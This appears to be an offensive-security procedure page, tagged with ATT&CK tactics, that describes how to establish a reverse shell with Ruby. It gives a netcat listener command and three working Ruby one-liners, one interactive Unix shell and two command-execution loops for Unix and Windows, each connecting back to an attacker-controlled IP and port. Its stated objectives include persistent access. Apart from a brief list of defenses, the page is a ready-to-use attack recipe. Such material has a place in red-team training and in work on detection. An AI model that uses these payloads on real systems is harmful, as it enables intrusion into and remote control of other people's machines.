---
type: procedure
description: >-
  Establishes a reverse shell connection using Ruby scripting to execute
  commands on a target system.
verified: true
submitted: false
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Reverse Shell]]'
  - '[[tags/Ruby]]'
commands:
  - '[[commands/ruby-interactive-reverse-shell]]'
  - '[[commands/ruby-remote-command-execution-unix]]'
  - '[[commands/ruby-remote-command-execution-windows]]'
platforms:
  - Linux
  - Windows
tools: []
validated: true
---

# Establish-Ruby-Reverse-Shell

## Summary

This procedure demonstrates how to establish a reverse shell using Ruby on a target system, allowing an attacker to execute commands remotely. It provides variants for interactive shells on Unix-like systems and command execution on both Unix and Windows, leveraging Ruby's socket library to connect back to the attacker's listener and bypass network restrictions.

## Description

A reverse shell enables the target machine to initiate a connection to the attacker's system, facilitating command execution and persistence. This technique uses Ruby, which may be pre-installed on many systems, to create a TCP socket connection. The attacker must set up a listener (e.g., using netcat) on a specified IP and port. Once connected, the attacker can interact with the target's shell or execute individual commands. This is useful in post-exploitation scenarios where direct access is restricted by firewalls, as outbound connections to common ports are often allowed. The procedure includes three variants: an interactive shell for Unix-like systems, a looped command executor for Unix, and a Windows-specific command executor.

## Requirements

1. Ruby must be installed on the target system (version 1.9+ typically sufficient).
2. The attacker must have network accessibility from the target (e.g., the target's firewall allows outbound TCP to the attacker's IP and port).
3. Attacker must run a listener on the specified IP and port (e.g., `nc -lvnp 4242`).
4. Target system privileges sufficient to execute Ruby scripts (often low-privilege is enough for initial access).

## Defense

Defensive measures and detection strategies:

- Implement network segmentation to limit lateral movement and outbound connections from critical systems.
- Monitor network traffic for anomalous outbound TCP connections to unexpected IPs/ports using tools like Zeek or Suricata.
- Use strong authentication mechanisms and endpoint detection to prevent unauthorized Ruby executions; enable process monitoring for ruby.exe or ruby invocations.
- Employ application whitelisting to restrict script interpreters like Ruby on endpoints.

## Objectives

1. Establish a reverse TCP connection from the target to the attacker's listener.
2. Enable interactive command execution or remote command dispatching on the target.
3. Maintain persistent access for post-exploitation activities.

## Instructions

### Step 1: Set Up Attacker Listener

**Context**: Before executing any payload on the target, start a listener on the attacker's machine to receive the incoming connection. This step ensures the reverse shell can connect successfully.

Use netcat or a similar tool:

```bash
nc -lvnp $_PORT
```

> Replace $_PORT with your chosen port (e.g., 4242). Expected output: Listener binds to the port and awaits connections.

### Step 2: Deploy Interactive Reverse Shell (Unix-like Systems)

**Context**: This variant creates an interactive shell by forking a process and redirecting stdin/stdout/stderr to the socket, providing full shell access.

**Code** ([[codes/Ruby-Reverse-Shell-Payloads]]):

Execute the following on the target using [[commands/ruby-interactive-reverse-shell]]:

```bash
ruby -rsocket -e'f=TCPSocket.open("$_ATTACKER_IP",$_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

> This loads Ruby's socket library, opens a TCP connection to the attacker's IP and port, duplicates the file descriptor for I/O redirection, and executes an interactive shell. On success, the listener receives a shell prompt (e.g., `$` or `#` depending on privileges).

### Step 3: Deploy Remote Command Execution (Unix-like Systems)

**Context**: For non-interactive scenarios or scripted execution, this variant loops to receive and execute commands from the attacker, supporting basic directory changes.

**Code** ([[codes/Ruby-Reverse-Shell-Payloads]]):

Execute the following on the target using [[commands/ruby-remote-command-execution-unix]]:

```bash
ruby -rsocket -e'exit if fork;c=TCPSocket.new("$_ATTACKER_IP","$_PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

> This forks the process, establishes the socket, and enters a loop to read commands, handling 'cd' for navigation or executing via popen and sending output back. Commands like 'exit' terminate the session. Expected: Output from each command echoed to the listener.

### Step 4: Deploy Remote Command Execution (Windows Systems)

**Context**: Windows variant for command execution without full interactive shell support, using a simple while loop to process incoming commands.

**Code** ([[codes/Ruby-Reverse-Shell-Payloads]]):

Execute the following on the target using [[commands/ruby-remote-command-execution-windows]]:

```bash
ruby -rsocket -e 'c=TCPSocket.new("$_ATTACKER_IP","$_PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

> This creates the socket and loops indefinitely, reading commands and executing them via popen, printing output to the socket. No built-in exit handling; kill the process to stop. Expected: Command outputs returned to the listener, e.g., `dir` shows directory listing.

### Step 5: Verify and Interact

**Context**: After deployment, interact via the listener to confirm access and perform actions.

Send test commands like `whoami` or `id` through the listener.

> Success is indicated by receiving the target's user context or system information. If no connection, check firewall rules, IP/port, and Ruby availability.
